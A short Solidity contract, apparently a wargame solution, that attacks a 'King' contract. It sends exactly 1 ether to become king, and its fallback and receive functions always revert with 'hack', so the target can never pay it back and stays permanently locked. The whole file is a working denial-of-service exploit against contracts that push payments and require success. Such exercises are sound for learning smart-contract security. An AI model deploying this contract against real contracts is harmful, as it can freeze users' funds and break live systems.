// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address king;

    constructor(address _king) {
        king = _king;
    }

    fallback() external payable {
        revert("hack");
    }

    receive() external payable {
        revert("hack");
    }

    function attack() public payable {
        require(msg.value == 1 ether, "send exactly 1 ether");

        (bool result, ) = king.call{value: msg.value}("");
        if (!result) revert();
    }
}
